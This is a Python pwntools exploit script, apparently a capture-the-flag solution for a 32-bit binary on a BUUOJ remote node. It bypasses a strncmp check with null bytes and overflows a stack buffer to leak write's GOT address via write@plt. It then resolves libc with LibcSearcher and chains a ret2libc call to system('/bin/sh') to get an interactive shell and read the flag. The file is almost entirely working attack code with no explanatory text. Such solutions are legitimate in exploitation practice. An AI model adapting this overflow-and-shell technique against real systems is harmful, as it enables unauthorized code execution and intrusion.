#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 0
os_level = 32
binary_name = 'pwn'
remote_addr = 'node5.buuoj.cn'
port = 29771

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF(libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda x: p.recvline(x)
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sla = lambda x, y: p.sendlineafter(x, y)
show = lambda x:log.success(x)
slp = lambda x:sleep(x)


#Main function
if __name__ == '__main__':
    #you can add your code here
    #gdb.attach(p)
    write_plt = elf.plt['write']
    write_got = elf.got['write']
    strncmp = b'\x00'*7 + p8(255)
    sl(strncmp)
    ru('Correct\n')
    payload = b'a'*0xE7 + b'b'*4 + p32(write_plt) + p32(0x08048825) + p32(1) + p32(write_got) + p32(0x4)
    sl(payload)
    write_addr = u32(rc(4))
    show(b'write_addr--> ' + bytes(str(hex(write_addr)),encoding='utf-8'))
    libc = LibcSearcher('write', write_addr)
    libc_base = write_addr - libc.dump('write')
    system_addr = libc_base + libc.dump('system')
    bin_sh = libc_base + libc.dump('str_bin_sh')
    show(b'libc_base--> ' + bytes(str(hex(libc_base)),encoding='utf-8'))
    show(b'system_addr--> ' + bytes(str(hex(system_addr)),encoding='utf-8'))
    show(b'bin_sh--> ' + bytes(str(hex(bin_sh)),encoding='utf-8'))
    sl(strncmp)
    payload = b'a'*0xE7 + b'b'*4 + p32(system_addr) + p32(0) + p32(bin_sh)
    sl(payload)
    ru('Correct\n')
    sl(b'cat flag')
    p.interactive()
